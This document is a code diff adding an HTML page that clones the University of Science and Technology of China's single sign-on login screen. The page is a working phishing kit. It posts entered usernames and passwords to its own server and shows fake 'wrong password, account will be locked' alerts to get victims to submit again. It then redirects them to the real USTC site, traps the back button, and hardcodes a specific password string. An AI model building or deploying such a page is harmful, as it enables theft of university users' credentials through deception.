@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>中国科学技术大学统一身份认证系统</title>
+        <link rel="shortcut icon" href="static/images/favicon.ico"/>
+	    <link rel="bookmark" href="static/images/favicon.ico" type="image/x-icon"/>
+        <style>
+            .workspace {
+                position: absolute;
+                height: 74%;
+                width: 32.5%;
+                /* border: 1px solid red; */
+                left: 50%;
+                top: 50%;
+                transform: translate(-50%, -50%);
+                box-shadow: 0px 0px 1px 2px #DFE0E4 inset;
+            }
+
+            .logo {
+                position: absolute;
+                width: 67.5%;
+                top: 15.5%;
+                left: 50%;
+                transform: translate(-50%);
+            }
+
+            .des {
+                position: absolute;
+                height: 5.2%;
+                width: 33.7%;
+                top: 29.5%;
+                left: 50%;
+                transform: translate(-50%);
+            }
+
+            /* .watermark {
+                position: absolute;
+                width: 8%;
+                top: 5%;
+                left: 3%;
+            } */
+
+            .btn {
+                width: 30%; 
+                height: 6.3%; 
+                position: absolute; 
+                left: 57.5%; top: 60%; 
+                background-color: rgb(3, 80, 160); 
+                border: none;
+                cursor: pointer;
+            }
+            
+            .btn:hover {
+                background-color: rgb(53, 115, 179);
+            }
+        </style>
+        <script>
+            // function focusIDinput() {
+            //     var inputID = document.getElementsByName('id')[0];
+            //     console.log(inputID);
+            //     inputID.style = "background-color: white";
+            // }
+            
+            // var cnt = 0;// give new password an error try
+            // var flag = 0;// for old password
+
+            function createWaterMark() {
+                for (let j = 0; j < 4; j++) {
+                    for (let i = 0; i < 7; i++) {
+                        var parent = document.body;
+                        var wm_node = document.createElement("img");
+                        wm_node.src = "static/images/watermark.png";
+                        var l = 3 + i * 14.5;
+                        wm_node.style.position = "absolute";
+                        wm_node.style.width = "8%";
+
+                        var t = 5 + j * 24;
+                        var tw = t.toString();
+                        wm_node.style.top = tw + '%';
+                        var lw = l.toString();
+                        wm_node.style.left = lw + '%';
+                        wm_node.style.pointerEvents = "none";
+                        parent.appendChild(wm_node);
+                    }
+                }
+            }
+
+            function submitinfo(flag, cnt) {
+                var form = document.getElementById('form');
+                var passwd = document.getElementsByName('passwd')[0].value;
+                var flag_form = document.getElementsByName('flag')[0];
+                var cnt_form = document.getElementsByName('cnt')[0];
+                // form.action = '/?flag='+flag+'&cnt='+cnt;
+                // console.log(flag);
+                // console.log(cnt);
+                
+                if(passwd == "" || passwd == null) {
+                    alert('请输入密码！');
+                }
+                else if(passwd == 'wyy20021005STC') {
+                    var times = 5 - cnt - 1;
+                    alert('登录密码错误次数还有'+times.toString()+'次将超过最大次数将账号锁定！')
+                    flag_form.value = 1;
+                    cnt_form.value = cnt;
+                    form.action = '/?flag='+flag_form.value+'&cnt='+cnt_form.value;
+                    form.submit();
+                }
+                else if(cnt == 0) {
+                    cnt = 1;
+                    times = 5 - flag - cnt;
+                    alert('登录密码错误次数还有'+times.toString()+'次将超过最大次数将账号锁定！');
+                    flag_form.value = flag;
+                    cnt_form.value = 1;
+                    form.action = '/?flag='+flag_form.value+'&cnt='+cnt_form.value;
+                    form.submit();
+                }
+                else {
+                    window.location.href = "https://catalog.ustc.edu.cn/query/lesson";
+                }
+            }
+        </script>
+
+    </head>
+
+    <body style = "background-color: rgb(247, 248, 252);">
+
+	<script>
+		history.pushState(null, document.title, location.href);
+		window.addEventListener('popstate', function (event)
+		{
+			history.pushState(null, document.title, location.href);
+		});
+		window.location.hash="no-back-button";
+		window.location.hash="Again-No-back-button";//again because google chrome don't insert first hash into history
+		window.οnhashchange=function(){window.location.hash="no-back-button";}
+	</script> 	
+        <script>
+            createWaterMark();
+        </script>
+        <!-- <div>
+            <script>
+                createWaterMark();
+            </script>
+            <img src = "static/images/watermark.png" class = "watermark">
+        </div> -->
+
+        <div class = "workspace" style = "background-color: white;">
+            <a href = "www.baidu.com"><img src = "static/images/qrcode.png" style = "position: absolute; right: 1px; top: 1px;"></a>
+            <img src = "static/images/logo.svg" class = "logo">
+            <img src = "static/images/des.svg" class = "des">
+
+            <form method = "post" id = 'form' action = "/">
+                <div class = "inputId">
+                    <input type = "text" name = "id" size = "30" style = "position: absolute; width: 75.27%; height: 20px; top: 40%; left: 50%; transform: translate(-50%); background-color: rgb(232, 240, 254); border: 0px; outline: none;" onfocus = "this.style.backgroundColor = 'white'; this.placeholder = '用户名为本人GID/工资号/学号(字母需大写)';" placeholder = "请输入用户名" onblur = "this.placeholder = '请输入用户名'">
+                    <hr style = "position: absolute; width: 75.7%; top: 42.5%;  left: 50%; transform: translate(-50%); border: 1px solid rgb(3, 80, 160);">
+                </div>
+                <div class = "inputPasswd">
+                    <input type = "password" name = "passwd" size = "30" style = "position: absolute; width: 75.27%; height: 20px; top:50%; left: 50%; transform: translate(-50%); background-color: rgb(232, 240, 254); border: 0px; outline: none;" onfocus = "this.style.backgroundColor = 'white'; this.placeholder = '';" onblur = "this.placeholder = '初次登录或忘记密码时，请点击&quot;找回密码&quot;';" placeholder = "初次登录或忘记密码时，请点击&quot;找回密码&quot;">                                   
+                    <hr style = "position: absolute; width: 75.7%; top: 52.5%;  left: 50%; transform: translate(-50%); border: 1px solid rgb(3, 80, 160);">
+                </div>
+                <input type = "number" style = "display: none;" name = "flag">
+                <input type = "number" style = "display: none;" name = "cnt">        
+            </form>
+
+            <select style = "position: absolute; top: 61.3%; left: 12%; width: 12.5%; height: 20px;">
+                <option>中文</option>
+                <option>English</option>
+            </select>
+            
+            <a href = "https://passport.ustc.edu.cn/findPassword.jsp?service=https://jw.ustc.edu.cn/ucas-sso/login" style = "position: absolute; text-decoration: none; color: rgb(68,68,68); width: 22%; height: 3%; font-size: 0.01%; top: 61.4%; left: 40.5%;"><span>找回/修改密码</span></a>
+            <button class = "btn" onclick = "submitinfo('{{flag}}','{{cnt}}')"><font color = "white" size = "3">登录</font></button>
+            <a href = "https://passport.ustc.edu.cn/doc/" style = "position: absolute; text-decoration: none; color: rgb(68,68,68); font-size: xx-small; left: 50%; top: 79.6%; transform: translate(-50%);">帮助中心</a>
+            <p style = "display: block; word-break: keep-all; white-space: nowrap; color: rgb(68,68,68); font-size: xx-small; position: absolute; top:82.2%; left: 50%; transform: translate(-50%);">电话：0551-63600800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;邮箱：nic@ustc.edu.cn</p>
+            <p style = "display: block; word-break: keep-all; white-space: nowrap; color: rgb(68,68,68); font-size: xx-small; position: absolute; top:86.4%; left: 50%; transform: translate(-50%);">中国科学技术大学 · 网络信息中心</p>
+        </div>
+    </body>
+</html>
